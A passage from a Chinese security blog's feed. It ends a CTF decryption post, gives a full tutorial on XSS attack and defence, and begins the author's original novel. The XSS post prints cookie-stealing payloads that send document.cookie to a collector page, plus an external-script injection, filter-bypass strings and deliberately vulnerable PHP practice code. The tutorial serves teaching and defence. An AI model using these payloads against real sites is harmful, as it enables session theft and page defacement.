class="keyword">while</span> i &lt; ctlen:</div><div class="line">    j = i % keylen</div><div class="line">    k = ascii.index(key[j])</div><div class="line">    m = ascii.index(ciphertext[i])</div><div class="line">    <span class="keyword">if</span> m &lt; k:</div><div class="line">        m += 26</div><div class="line">    plaintext += ascii[m-k]</div><div class="line">    i += 1</div><div class="line">with open(<span class="string">'result.txt'</span>,<span class="string">'w'</span>) as f:</div><div class="line">    f.write(plaintext)</div></pre></td></tr></table></figure></p>
<h3 id="jsfuck-or-jother"><a href="#jsfuck-or-jother" class="headerlink" title="jsfuck or jother"></a>jsfuck or jother</h3><p>以下内容参考：<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">http://www.secbox.cn/hacker/ctf/8078.html</a><br>密文例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="linediv></pre></td></tr></table></figure></p>
<p>解密方法：alert(xxx)、console(xxx)、document.write(xxx)，xxx为密文内容。<br>在线解密：<a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>关于Base64/16进制／URL编码／js编码／HTML编码等转化以及各种混淆技术，这里不再介绍，有很多在线转化工具。<br>关于CTF更多内容，可参考个人项目：<a href="https://github.com/tengzhangchao/CTF-LEARN" target="_blank" rel="external">https://github.com/tengzhangchao/CTF-LEARN</a></p>
<p><em>说明：以上脚本若有运行错误或者编写错误可留言告知；若有补充可留言说明；另外本篇有些代码来自早期互联网收集，已遗忘原地址，若有知者望告之，在此表示感谢！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;科技的精灵已经从瓶中跑了出来，但我们还不知道真正降临的时刻&lt;/blockquote&gt;&lt;br&gt;　　今日在翻看笔记的时候，无意看到了之前为参加CTF时做的准备工作，主要包括了各种加密解密，web安全，PWN溢出等内容的练习题以及解决脚本。由于内容部分来自本人参加ctf时所做的题以及部分来自互联网，因此准备在此分享记录一番。本篇主要介绍几种CTF中常见加密算法的解密脚本，关于加密原理会适当提及，但不会深入。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="CTF" scheme="http://thief.one/tags/CTF/"/>
    
      <category term="加密与解密" scheme="http://thief.one/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
      <category term="隐写术" scheme="http://thief.one/tags/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>浅谈跨站脚本攻击与防御</title>
    <link href="http://thief.one/2017/05/31/1/"/>
    <id>http://thief.one/2017/05/31/1/</id>
    <published>2017-05-31T01:47:30.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">路漫漫其修远兮，吾将上下而求索</blockquote><br>　　跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。xss漏洞是web渗透测试中最常见而又使用最灵活的一个漏洞，近期在拜读了《白帽子讲web安全》、《Web实战篇》、《XSS跨站脚本攻击剖析与防御》等几部佳作后，决定整理关于Xss漏洞的一些知识，并以本篇作为记录，权当笔记or读后感。<br>　　本篇内容主要包含xss漏洞攻击与防御理论知识，以及结合原创的xss漏洞闯关平台，通过实操的方式展示xss的攻击以及防御方法。由于xss理论知识网上非常丰富，这里不做详细讲解，本篇内容着重实操练习的过程。<br><a id="more"></a></p>
<h3 id="Xss分类"><a href="#Xss分类" class="headerlink" title="Xss分类"></a>Xss分类</h3><p>xss大致分为：反射型、存储型、DOM型（这三种为主流）<br>反射型xss：只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。<br>存储型xss：会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。<br>DOM型xss：从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。</p>
<h3 id="Xss危害"><a href="#Xss危害" class="headerlink" title="Xss危害"></a>Xss危害</h3><p>　　xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，且主要就是用来执行js获取用户信息（比如浏览器版本等等）。然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。</p>
<ul>
<li>cookie劫持（窃取cookie）</li>
<li>后台增删改文章等操作（类似于csrf骗取用户点击，利用js模拟浏览器发包，借助xmlhttprequest类）</li>
<li>钓鱼，利用xss构造出一个登录框，骗取用户账户密码。</li>
<li>Xss蠕虫（利用xss漏洞进行传播）</li>
<li>修改网页代码</li>
<li>利用网站重定向</li>
<li>获取用户信息（如浏览器信息，IP地址等）</li>
</ul>
<h4 id="利用xss窃取cookie"><a href="#利用xss窃取cookie" class="headerlink" title="利用xss窃取cookie"></a>利用xss窃取cookie</h4><p>利用xss进行cookie获取劫持是最常用的一种姿势，因为其能获取到管理员权限，危害较大，且利用简单。</p>
<h5 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a>cookie介绍</h5><p>cookie分为内存cookie和硬盘cookie，内存cookie储存在浏览器内存中，关闭浏览器则消失。cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。<br>cookie格式：Set-Cookie:<name>=<value>[;<max-age>=<age>][;expiress=<date>][;domain=<domain_name>][;path=<some_path>][;secure][;httponly]<br>cookie各个参数详细内容：</some_path></domain_name></date></age></max-age></value></name></p>
<ul>
<li>Set-cookie:http响应头，向客户端发送cookie。</li>
<li>Name=value:每个cookie必须包含的内容。</li>
<li>Expires=date:EXpires确定了cookie的有效终止日期，可选。如果缺省，则cookie不保存在硬盘中，只保存在浏览器内存中。</li>
<li>Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的cookie，缺省为该web服务器域名。</li>
<li>Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie。</li>
<li>Secure:在cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。</li>
<li>Httponly:禁止javascript读取,如果cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。</li>
</ul>
<h5 id="利用xss窃取cookie方法"><a href="#利用xss窃取cookie方法" class="headerlink" title="利用xss窃取cookie方法"></a>利用xss窃取cookie方法</h5><p>本地写一个xss_cookie.php页面，用于接收cookie。<br><img src="/upload_image/20170531/3.png" alt=""><br>在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到xss_cookie.php，并且将cookie参数传递进去，写入文件中。<br><img src="/upload_image/20170531/4.png" alt=""><br>常用获取cookie的js代码(可自行扩展):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"http://localhost/cspt/XSS_cookie.php?cookie='+document.cookie"</span>&gt;&lt;/img&gt;</div><div class="line">&lt;script&gt;new Image().src=<span class="string">"http://localhost/cspt/XSS/xss_cookie.php?cookie="</span>+document.cookie;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>提交之后，本地cookie.txt文件中就会写入cookie值。<br><img src="/upload_image/20170531/5.png" alt=""></p>
<h4 id="利用xss篡改网页"><a href="#利用xss篡改网页" class="headerlink" title="利用xss篡改网页"></a>利用xss篡改网页</h4><p>前提：网站必须存在存储型xss漏洞，并且会将结果返回到页面上。<br>这样我们就可以插入一段js代码，作用在于获取网站源码中的标签，然后修改其中的属性值，达到修改网页的效果。<br>实例：修改网站所有连接地址<br>本地编写一个test.js脚本，内容如下：<br><img src="/upload_image/20170531/6.png" alt=""><br>将以下语句插入存在存储型xss漏洞的网站<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">'text/javascript'</span> src=<span class="string">'http://localhost/cspt/XSS/test.js'</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>可以发现存在该漏洞的网页上所有的链接都变成了www.google.com。</p>
<p><em>注：javascript加载外部的代码文件可以是任意扩展名（无扩展名也可以）</em></p>
<h4 id="利用xss获取用户信息"><a href="#利用xss获取用户信息" class="headerlink" title="利用xss获取用户信息"></a>利用xss获取用户信息</h4><p>　　xss获取用户信息，运用最多的还是获取cookie信息，但除此之外，还可以获取用户浏览器版本、外网IP地址、浏览器安装的插件类型等等。以下列举了利用xss获取的客户端用户信息（包含但不仅限于以下几种）。</p>
<ul>
<li>alert(navigator.userAgent);读取userAgent内容</li>
<li>alert(document.cookie);读取用户cookie内容</li>
<li>利用java环境，调用java Applet的接口获取客户端本地IP</li>
</ul>
<p><em>注：利用Xss漏洞能做的事有很多，前面已经列举了一些，这里便不对每一个都展开讲解，如需了解更多的xss漏洞内容，最好的方式还是看书。</em></p>
<h3 id="Xss漏洞探测"><a href="#Xss漏洞探测" class="headerlink" title="Xss漏洞探测"></a>Xss漏洞探测</h3><p>前面介绍了一些xss漏洞的基础内容，那么如何去检测一个网站（某个点）是否存在xss漏洞呢？</p>
<h4 id="xss探针"><a href="#xss探针" class="headerlink" title="xss探针"></a>xss探针</h4><p>我们可以在测试xss的位置写入以下代码，查看页面源码，观察哪些代码被过滤或者转义。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span>;!--<span class="string">"&lt;XSS&gt;=&amp;&#123;()&#125;</span></div></pre></td></tr></table></figure></p>
<p>xss探针可检测出网站有没有对xss漏洞做最基础的防御。</p>
<h4 id="基础xss语句"><a href="#基础xss语句" class="headerlink" title="基础xss语句"></a>基础xss语句</h4><p>除了xss探针以外，我们也可以输入最简单的测试语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>如果插入的语句被原封不动的呈现在了浏览器中，那么说明了2个问题：</p>
<ul>
<li>代码没有被过滤，说明存在xss</li>
<li>代码没有被执行，因为没有闭合类似textarea标签，可以查看下源码。</li>
</ul>
<p>如果发现某些参数被过滤了，那么尝试使用其他方式（详细介绍在绕过一节会讲）。</p>
<h4 id="xss检测常用语句"><a href="#xss检测常用语句" class="headerlink" title="xss检测常用语句"></a>xss检测常用语句</h4><p>列举一些常用的xss漏洞检测代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/xss/);&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(/xss/)//</div><div class="line">&lt;script&gt;alert(<span class="string">"xss"</span>);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;/script&gt;//用分号，也可以分号+空格（回车一起使用）</div><div class="line">&lt;img src=1 onmouseover=alert(1)&gt;</div><div class="line">&lt;a herf=1 onload=alert(1)&gt;nmask&lt;/a&gt;</div><div class="line">&lt;script&gt;window.a==1?1:prompt(a=1)&lt;/script&gt;</div><div class="line">&lt;script&gt;a=prompt;a(1)&lt;/script&gt;</div><div class="line">&lt;img src=0 onerror=confirm(<span class="string">'1'</span>)&gt;</div></pre></td></tr></table></figure></p>
<h3 id="Xss防御"><a href="#Xss防御" class="headerlink" title="Xss防御"></a>Xss防御</h3><p>　　如何利用xss漏洞实施攻击并不是身为安全工程师的重点，xss防御才是我们努力要去做的。以下列举几种常见的xss防御方式，个人认为也是非常有效的方式。</p>
<ul>
<li>可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）</li>
<li>xss filter（检查输入，设置白名单方式）</li>
<li>输出检查（编码，转义，常用编码：html编码，js编码，16进制等)</li>
<li>针对不同位置的输出，使用不同的处理方式</li>
<li>处理富文本</li>
</ul>
<h4 id="设置httponly"><a href="#设置httponly" class="headerlink" title="设置httponly"></a>设置httponly</h4><p>　　httponly无法完全的防御xss漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题。Httponly是在set-cookie时标记的，可对单独某个参数标记也可对全部参数标记。由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准。</p>
<h4 id="xss-filter"><a href="#xss-filter" class="headerlink" title="xss filter"></a>xss filter</h4><p>　　Xss filter往往是一个文本文件，里面包含了允许被用户输入提交的字符（也有些是包含不允许用户提交的字符）。它检测的点在于用户输入的时候，xss filter分为白名单与黑名单，推荐使用白名单，但即使使用白名单还是无法完全杜绝xss问题，并且使用不当可能会带来很高的误报率。</p>
<h4 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h4><p>　　编码方式有很多，比如html编码、url编码、16进制编码、javascript编码等。<br>在处理用户输入时，除了用xss filter的方式过滤一些敏感字符外，还需要配合编码，将一些敏感字符通过编码的方式改变原来的样子，从而不能被浏览器当成js代码执行。</p>
<h4 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h4><p>　　有些网页编辑器允许用户提交一些自定义的html代码，称之为”富文本”。想要在富文本处防御xss漏洞，最简单有效的方式就是控制用户能使用的标签，限制为只能使用<em>a、div</em>等安全的标签。</p>
<h4 id="处理所有输出类型的xss漏洞"><a href="#处理所有输出类型的xss漏洞" class="headerlink" title="处理所有输出类型的xss漏洞"></a>处理所有输出类型的xss漏洞</h4><p>　　xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义。</p>
<h5 id="HTML标签中输出"><a href="#HTML标签中输出" class="headerlink" title="HTML标签中输出"></a>HTML标签中输出</h5><p>即用户输入的内容直接在标签中显示:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;<span class="variable">$input</span>&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>防御方式，将用户输入进行html编码。</p>
<h5 id="HTML属性中输出"><a href="#HTML属性中输出" class="headerlink" title="HTML属性中输出"></a>HTML属性中输出</h5><p>即用户输入的内容出现在标签的某个属性中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div name=<span class="string">"<span class="variable">$input</span>"</span>&gt;&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>防御方式，将用户输入进行html编码。</p>
<h5 id="Script标签中输出"><a href="#Script标签中输出" class="headerlink" title="Script标签中输出"></a>Script标签中输出</h5><p>即用户输入的内容出现在script标签里面：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var a=<span class="string">"<span class="variable">$input</span>"</span>;  // <span class="variable">$input</span>=<span class="string">";alert(/xss/);//"</span>; 则会产生xss漏洞</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>防御方式，将用户输入进行javascript编码。</p>
<h5 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h5><p>即在事件标签中输出用户输出的内容，比如onclick标签等。<br>防御方式，将用户输入进行javascript编码。</p>
<h5 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h5><p>即用户输入的内容出现在了css的style等标签中。<br>防御方式，进行十六进制编码。</p>
<h5 id="在地址中输出"><a href="#在地址中输出" class="headerlink" title="在地址中输出"></a>在地址中输出</h5><p>这个跟在html属性中输出类似，即在a标签的href属性中输出。<br>防御方式，将用户输入进行url编码。</p>
<font color="#0593d3">总结：总得来说防御xss的方式只是三种：httponly、过滤字符、转义字符。然而使用何种编码转义，什么地方需要做转义才是真正防御xss漏洞的难点及重点，如果能搞明白并解决这个问题，那么xss漏洞将会无处可寻。————《白帽子将web安全》一书xss篇读后感。</font>

<h3 id="Xss绕过技巧"><a href="#Xss绕过技巧" class="headerlink" title="Xss绕过技巧"></a>Xss绕过技巧</h3><p>　　有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。作为一名安全工程师，了解如何绕过xss防御可以更好地解决xss防御问题。（这里探讨的绕过xss防御不包含绕过waf的部分）</p>
<h4 id="绕过xss-filter"><a href="#绕过xss-filter" class="headerlink" title="绕过xss filter"></a>绕过xss filter</h4><p>绕过xss filter的前提在于，xss filter使用了黑名单，并且没有过滤完全。<br>前提一：如果过滤了”《script》”字符串,但没有过滤”&lt;”、”&gt;”字符，则可以使用javascript:[code]伪协议的形式。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"javascript:alert('test');"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>前提二：过滤了《script》，且只过滤一次。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;ipt&gt;</div></pre></td></tr></table></figure></p>
<p>前提三：没有正确处理空格、回车等字符<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"javas</span></div><div class="line">Cript:</div><div class="line">Alert(/xss/)" width=100&gt;</div></pre></td></tr></table></figure></p>
<p>关于绕过xss filter的方式还有很多，这里不一一展开了，只是列举下常见的方法：</p>
<ul>
<li>转换大小写</li>
<li>大小写混写</li>
<li>双引号改单引号</li>
<li>引号改为/</li>
<li>用全角字符</li>
<li>使用javascript伪协议</li>
<li>使用回车、空格等特殊字符</li>
<li>在css的style中使用/**/注释符</li>
<li>使用字符编码</li>
<li>利用事件触发xss</li>
</ul>
<h3 id="Xss闯关实操"><a href="#Xss闯关实操" class="headerlink" title="Xss闯关实操"></a>Xss闯关实操</h3><p>　　为了加深对xss漏洞的理解，我特意用php编写了一套xss闯关练习平台，里面包含了一些常见的xss防御题型，我们需要做的就是如何去绕过这些防御，以及思考这些防御的弱点在于哪里？<br>xss闯关练习平台页面展示：<br><img src="/upload_image/20170531/1.png" alt=""><br>因为时间有限，并没有对页面进行美化，凑合着用用~!~。<br><img src="/upload_image/20170531/2.png" alt=""><br>平台题目由易到难，接下来的实操以及介绍也会从简单到复杂。介绍时，我会分别展示php源码中的防御方式（展示服务端代码），以及如何去绕过这些防御（展示客户端html代码）。</p>
<h4 id="无任何过滤"><a href="#无任何过滤" class="headerlink" title="无任何过滤"></a>无任何过滤</h4><p>下图是最简单的一个xss练习例子，网页从url中获取参数id的值，直接在页面中显示出来，没有做任何过滤。<br><img src="/upload_image/20170531/7.png" alt=""><br>查看网页源代码：<br><img src="/upload_image/20170531/8.png" alt=""><br>查看php代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="string">'当前提交的参数:'</span>.<span class="string">'&lt;font color=red&gt;'</span>.<span class="variable">$id</span>.<span class="string">'&lt;/font&gt;'</span>;</div></pre></td></tr></table></figure></p>
<h4 id="过滤《script》"><a href="#过滤《script》" class="headerlink" title="过滤《script》"></a>过滤《script》</h4><p>那么一般情况下，网站不可能对用户输入不做任何过滤，比如以下案例：<br><img src="/upload_image/20170531/9.png" alt=""><br>通过观察html代码我们可以看到过滤了《script》以及《/script》，查看下php代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="variable">$id</span>=preg_replace(<span class="string">"/&lt;script&gt;/"</span>, <span class="string">""</span>, <span class="variable">$id</span>);</div><div class="line"><span class="variable">$id</span>=preg_replace(<span class="string">"/&lt;\/script&gt;/"</span>, <span class="string">""</span>, <span class="variable">$id</span>);</div><div class="line"><span class="built_in">echo</span> <span class="string">'提交的参数:'</span>.<span class="string">'&lt;font color=red&gt;'</span>.<span class="variable">$id</span>.<span class="string">'&lt;/font&gt;'</span>;</div></pre></td></tr></table></figure></p>
<p>绕过方式：<br><img src="/upload_image/20170531/10.png" alt=""></p>
<h4 id="过滤alert"><a href="#过滤alert" class="headerlink" title="过滤alert"></a>过滤alert</h4><p>让我们增加点难度，直接看第5题：<br><img src="/upload_image/20170531/11.png" alt=""><br>这回我们输入内容后，网页直接显示报错，而不是返回过滤后的内容，这将会增加我们判断服务端过滤规则的难度。为了方便演示，我这边直接打开php代码查看（实际测试过程肯定是比较漫长的，需要一个个标签去试）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/alert/i'</span>,<span class="variable">$id</span>))&#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">'出错啦!'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">'提交的参数:'</span>.<span class="string">'&lt;font color=red&gt;'</span>.<span class="variable">$id</span>.<span class="string">'&lt;/font&gt;'</span>;</div></pre></td></tr></table></figure></p>
<p>知道了服务端过滤了alert标签后，我们就可以构造绕过方式了:<br><img src="/upload_image/20170531/12.png" alt=""><br>能构造弹框的标签有好几种（当然真实环境应该不会只过滤弹框标签）</p>
<h4 id="结合事件构造xss"><a href="#结合事件构造xss" class="headerlink" title="结合事件构造xss"></a>结合事件构造xss</h4><p>乍一看第8题并没有什么很好的思路。<br><img src="/upload_image/20170531/13.png" alt=""><br>然后我通过查看html源码，寻找一些蛛丝马迹：<br><img src="/upload_image/20170531/14.png" alt=""><br>在测试几次后，我们发现网页源码中的变化：<br><img src="/upload_image/20170531/15.png" alt=""><br>让我们来看看php代码是怎么写的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"&lt;?php echo <span class="variable">$_SERVER</span>['PHP_SELF']; ?&gt;"</span> method=<span class="string">'post'</span>&gt;</div><div class="line">YOUR CODE:&lt;input <span class="built_in">type</span>=<span class="string">'text'</span> name=<span class="string">'code'</span>/&gt;</div><div class="line">          &lt;input <span class="built_in">type</span>=<span class="string">'submit'</span> name=<span class="string">'submit'</span>/&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到php代码实现了将网页自身的url输出到form的action属性中。<br>构造xss：<br><img src="/upload_image/20170531/16.png" alt=""><br>查看下html源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"/XSS/xss_8.php /"</span> onsubmit=<span class="string">'alert(1)'</span> name=<span class="string">""</span> method=<span class="string">'post'</span>&gt;</div></pre></td></tr></table></figure></p>
<p>然后点击按钮，执行了onsubmit事件。</p>
<font color="#0593d3">总结：关于xss的案例还有很多，由于篇幅的关系，这里不一一演示了。xss练习平台只是列举了最基础且常见的xss漏洞情况，实例后期可以再进行增加，而关键点在于通过实操可以让我们深刻理解xss发生的位置，以及如何更好地去防御它。</font>

<h3 id="Xss平台"><a href="#Xss平台" class="headerlink" title="Xss平台"></a>Xss平台</h3><p>xss漏洞的利用离不开一个强大的xss平台，关于xss平台的搭建与使用，请移步：<a href="http://thief.one/2017/03/15/Xss%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/">xss平台搭建小记</a></p>
<font color="#0593d3">说明：本文将会持续更新一些xss绕过以及防御姿势，目前本文对绕过以及防御姿势的描述有限，一是由于本人对xss漏洞理解不够深入，二是由于缺乏测试案例。但随着学习的深入，相信会记录更多更好的干货，尽情期待哦。</font>

]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;路漫漫其修远兮，吾将上下而求索&lt;/blockquote&gt;&lt;br&gt;　　跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。xss漏洞是web渗透测试中最常见而又使用最灵活的一个漏洞，近期在拜读了《白帽子讲web安全》、《Web实战篇》、《XSS跨站脚本攻击剖析与防御》等几部佳作后，决定整理关于Xss漏洞的一些知识，并以本篇作为记录，权当笔记or读后感。&lt;br&gt;　　本篇内容主要包含xss漏洞攻击与防御理论知识，以及结合原创的xss漏洞闯关平台，通过实操的方式展示xss的攻击以及防御方法。由于xss理论知识网上非常丰富，这里不做详细讲解，本篇内容着重实操练习的过程。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="跨站脚本攻击" scheme="http://thief.one/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="xss漏洞" scheme="http://thief.one/tags/xss%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>【原创小说】北岛流年</title>
    <link href="http://thief.one/2017/05/26/1/"/>
    <id>http://thief.one/2017/05/26/1/</id>
    <published>2017-05-26T06:17:18.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">左手华灯初上，右手星点余光</blockquote><br>　　废话不多说，扒几篇躺在QQ空间的原创小说，应该是3、4年前写的东西。回想当年还是一个意气风发的少年，遥想当年羽扇纶巾，谈笑间…..扯远了。回归正题，开博至今都是在分享一些技术内容，是时候调调味了，因此我在博客中新增了一个分类：<a href="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"><font color="#0593d3">诗意年华</font></a>，专门用来分享一些本人原创的小说或者诗歌，也算是对以往生活的一个祭奠。<br><a id="more"></a></p>
<p><center><img src="/upload_image/20170526/1.png" alt=""></center></p>
<h4 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h4><p>北国狼烟四起，战火纷飞，黎民饥离苦散，北岛城生灵涂炭。连年的天灾，使得北岛国力衰微，各方三国随即联合来袭，此时的北岛虽是四国之首，但天灾人祸使它无力反抗，只能坐以待毙。</p>
<p>三国联盟已是兵临城下，眼看就要破城而入，到那时城内几十万百姓都将难逃厄运。霎时，天空乌云密布，北岛城门缓缓开启，战神将军挥师迎敌，纵然将军身为北岛国的战神，但敌众我寡的劣势仍无法改变。</p>
<p>战神将军带领着北岛国的士兵拼到了最后，到最后一刻他仍用双手紧紧的按住城门，直至在金戈铁马滚滚沙场中化为一尘、一埃。</p>
<p>城门破了，天地浩劫如数应验，杀戮一直蔓延到天明，血流成河……</p>
<h4 id="祭神节"><a href="#祭神节" class="headerlink" title="祭神节"></a>祭神节</h4><font color="#0593d3"><em>有没有一个人可以爱你不变，即使飞速流年</em></font>

<p>百年之后的北岛城已是生机勃勃，一片盎然之色。时间冲刷了战乱的痛苦，流年往往使回忆成尘埃。然而，北岛城城门口竖立着当年浴血奋战的战神将军像，虽说将军未能保护北岛国，但北岛的百姓仍无比的敬重他，为他设立祠堂，并告诫子孙世世代代供奉这位伟大的将军。</p>
<p>每年冬季举行祭神节，就是为了纪念他，百姓往往会烧香祈祷北岛国泰民安、风调雨顺。这年冬季，又到了祭拜战神将军之时，北岛百姓陆陆续续汇成滚滚人群准备上山参加祭祀，场面好不热闹。</p>
<p>清晨的阳光慵懒地照进窗户，落定在了秦铭熟睡的身子。</p>
<p>“秦铭，准备好了吗?祭祀大典要开始了”福记当铺的秦三叫唤着他儿子上山参加祭祀。</p>
<p>祭祀大典非常庄严隆重，未成年时是不能参加的，因此每年正值成年的青年就会上山祈祷战神将军，希望自己以后也能像当年的战神将军战场杀敌，为国立业。</p>
<p>“哦，来了，来…了…再睡会儿。”秦铭今年正值成年，以往都没有参加过祭祀大典，对此毫无兴趣，相比之下他更爱舒适的大床。</p>
<p>秦三忙忙活活的打理好衣裳，冲进秦铭的房间，看着正洋洋大睡的他，怒火横生，一把掀翻了他的木床，只听一声巨响，秦铭迷迷糊糊的从睡梦中醒来。</p>
<p>“爹，呵呵！你脸色怎么这么难看啊，刚才怎么了，是不是敌军攻城，把我床都弄翻了”秦铭一脸疑惑地望着秦三，秦三更是一肚子的火，“现在都什么时候了，还睡！什么攻城，是我把你床掀翻的。今天对你来说是很重要的日子，不能耽搁，你就别折腾我这把老骨头了。诶，我迟早被你气死！”秦三气得一屁股坐在了地上，重重的咳了几声，他的身体是越来越差了。</p>
